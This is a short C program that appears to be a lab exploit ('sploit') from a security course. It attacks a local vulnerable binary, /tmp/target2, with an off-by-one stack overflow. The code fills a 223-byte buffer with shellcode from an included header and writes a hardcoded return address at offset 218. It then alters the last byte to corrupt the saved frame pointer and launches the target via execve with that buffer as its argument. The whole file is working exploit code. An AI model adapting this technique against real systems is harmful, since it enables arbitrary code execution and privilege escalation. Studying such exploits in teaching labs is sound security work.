#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define BUFF_LENGTH 223

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;

  char buff[BUFF_LENGTH];
  int i;

  // fill buffer with non-null characters
  memset (buff, 1, sizeof buff);

  // fill beginning of buffer with shellcode
  for(i = 0; i < strlen(shellcode); ++i)
    buff[i] = shellcode[i];

  // address of beginning of shellcode placed at end of buffer
  *(long*)(buff + 218) = 0xbffffcaa;
  
  // buff[218] = 0xbf;
  // buff[219] = 0xff;
  // buff[220] = 0xfc;
  // buff[221] = 0xaa;


  // final byte of buffer will replace final byte of ebp
  buff[222] = 0x84 - 4; // subtract 4 since ebp is popped from stack (adds 4)


  args[1] = buff; 

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;

}
